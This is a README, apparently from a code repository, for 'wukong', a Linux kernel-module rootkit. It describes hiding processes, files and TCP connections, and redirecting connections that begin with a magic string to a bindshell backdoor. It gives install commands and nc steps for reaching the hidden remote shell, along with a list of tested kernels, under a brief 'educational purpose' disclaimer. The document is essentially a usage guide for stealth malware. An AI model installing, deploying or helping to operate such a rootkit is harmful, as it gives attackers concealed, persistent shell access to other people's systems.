# wukong: A LKM rootkit for Linux kernel 2.6.x, 3.x and 4.x
<h1>
	Note:
</h1>
<p>
	<strong>This kernel rootkit is just for educational purpose and it shouldn't be used for any illegal activities, use this at your own risk.</strong>
</p>
<br />
<br />
<h1>
	Function
</h1>
<strong>1. Hide Linux Process.</strong><br />
<strong>2. Hide TCP connection.</strong><br />
<strong>3. Hide File/Directory.</strong><br />
<strong>4. Redirect TCP connection to backdoor server by using the specific confidential password.</strong><br />
<br />
<h1>
	Usage
</h1>
<h2>
	1. Environment:
</h2>
ubunt-14.04 (1.1.1.33) --- (1.1.1.1)ubunt-14.04 &nbsp;<br />
(client)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (server)<br />
<br />
<br />
<h2>
	2. Test step:
</h2>
<h3>
	a. on server
</h3>
cd wukong/<br />
sudo ./install.pl<br />
<br />
sudo nc -k -l 80<br />
<br />
<h3>
	b. on client
</h3>
nc 1.1.1.1 80<br />
http<br />
ifconfig<br />
<br />
PS：The connection will be redirected to bindshell<br />
<br />
nc 1.1.1.1 80<br />
111111<br />
<br />
PS: a rst will be received.<br />
<br />
nc 1.1.1.1 80<br />
111111<br />
aaaaaa<br />
<br />
PS: The connection will be connected with tcp 80.<br />
<br />
<h2>
	3. Result:
</h2>
<strong>a. Hide bindshell file.</strong><br />
<strong>b. Hide tcp 8000 connection.</strong><br />
<strong>c. Hide bindshell process</strong><br />
<strong>d. If "http" is the first four bytes to TCP 80, connection will be established with bindshell.</strong><br />
<br />
<br />
<h1>
	Tested OS:
</h1>
CentOS-5.5-i386-bin-DVD.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 2.6.18-408.el5 #1 SMP Tue Jan 19 09:13:33 EST 2016 i686 i686 i386 GNU/Linux<br />
CentOS-5.5-x86_64-bin-DVD<br />
&nbsp;&nbsp;&nbsp; Linux 2.6.18-194.el5 #1 SMP Fri Apr 2 14:58:14 EDT 2010 x86_64 x86_64 x86_64 GNU/Linux<br />
ubuntu-14.04.2-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux<br />
ubuntu-14.04.2-desktop-amd64.iso&nbsp; &nbsp;<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:43:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
ubuntu-14.04.3-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux<br />
ubuntu-14.04.3-desktop-amd64.iso<br />
&nbsp;&nbsp;&nbsp; Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
<br />
